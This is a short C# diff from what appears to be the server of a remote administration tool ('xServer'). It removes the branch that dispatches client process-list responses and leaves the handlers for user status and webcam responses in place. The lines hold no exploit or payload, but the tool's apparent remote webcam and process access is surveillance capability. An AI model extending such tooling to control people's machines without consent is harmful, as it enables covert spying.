@@ -21,11 +21,6 @@ namespace xServer.Core.Networking
             {
                 CommandHandler.HandleSetUserStatus(client, (SetUserStatus)packet);
             }
-            else if (type == typeof(GetProcessesResponse))
-            {
-                CommandHandler.HandleGetProcessesResponse(client,
-                    (GetProcessesResponse)packet);
-            }
             else if (type == typeof(GetWebcamsResponse))
             {
                 CommandHandler.HandleGetWebcamsResponse(client, (GetWebcamsResponse)packet);
